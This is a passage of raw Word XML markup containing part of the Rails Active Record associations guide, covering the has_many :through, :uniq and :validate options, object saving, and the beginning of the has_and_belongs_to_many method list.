      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies a join model through which to perform the query. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations provide a way to implement many-to-many relationships, as discussed </w:t>
      </w:r>
      <w:hyperlink r:id="rId218" w:anchor="the-has_many-through-association" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>earlier in this guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAB8BDE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.22 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:uniq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4921AC2C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:uniq</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to true to keep the collection free of duplicates. This is mostly useful together with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="41B2A4A2" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BD6FCBC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Person &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71AA8F96" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :readings</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37535EC9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :posts, :through</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :readings</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14681113" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7763C763" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49E517BA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>person = Person.create(:name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'john')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74CC10A9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>post   = Post.create(:name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'a1')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53A81848" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>person.posts &lt;&lt; post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72B869C8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>person.posts &lt;&lt; post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27BEFF84" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>person.posts.inspect # =&gt; [#&lt;Post id: 5, name: "a1"&gt;, #&lt;Post id: 5, name: "a1"&gt;]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="655D271E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Reading.all.inspect  # =&gt; [#&lt;Reading id: 12, person_id: 5, post_id: 5&gt;, #&lt;Reading id: 13, person_id: 5, post_id: 5&gt;]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7D62A28E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the above case there are two readings and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>person.posts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> brings out both of them even though these records are pointing to the same post.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C031B45" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now let’s set </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:uniq</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to true:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="231C09A9" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E39FF4F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Person</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="020439FE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :readings</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="773172E7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :posts, :through</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :readings, :uniq</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F11F983" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F9DEF3B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58EF7FB3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>person = Person.create(:name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'honda')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7702EAFD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>post   = Post.create(:name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'a1')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45FDDA81" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>person.posts &lt;&lt; post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36B46499" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>person.posts &lt;&lt; post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41842456" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>person.posts.inspect # =&gt; [#&lt;Post id: 7, name: "a1"&gt;]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0572E085" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Reading.all.inspect  # =&gt; [#&lt;Reading id: 16, person_id: 7, post_id: 7&gt;, #&lt;Reading id: 17, person_id: 7, post_id: 7&gt;]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05AB6CD8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the above case there are still two readings. However </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>person.posts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shows only one post because the collection loads only unique records.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7B42C8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.23 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBDC1DB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then associated objects will not be validated whenever you save this object. By default, this is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>: associated objects will be validated when this object is saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC2C82C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.3.3 When are Objects Saved?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6486231D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you assign an object to a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, that object is automatically saved (in order to update its foreign key). If you assign multiple objects in one statement, then they are all saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08FDF55E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If any of these saves fails due to validation errors, then the assignment statement returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the assignment itself is cancelled.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BAC4DC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the parent object (the one declaring the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association) is unsaved (that is, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>new_record?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>) then the child objects are not saved when they are added. All unsaved members of the association will automatically be saved when the parent is saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451ED7C1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to assign an object to a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association without saving the object, use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.build</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B47EAEB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association Reference</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210C111D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association creates a many-to-many relationship with another model. In database terms, this associates two classes via an intermediate join table that includes foreign keys referring to each of the classes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F953E8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1 Methods Added by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0614EB56" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you declare a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, the declaring class automatically gains 13 methods related to the association:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9505FA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(force_reload = false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F132974" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;&lt;(object, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2A14B1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.delete(object, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4268A411" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436AEAE1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C1973F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids=ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D44019" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.clear</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61ABF4CB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.empty?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CDAF74D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174DF980" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.find(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256963A4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.where(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572050A3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.exists?(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC250B0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
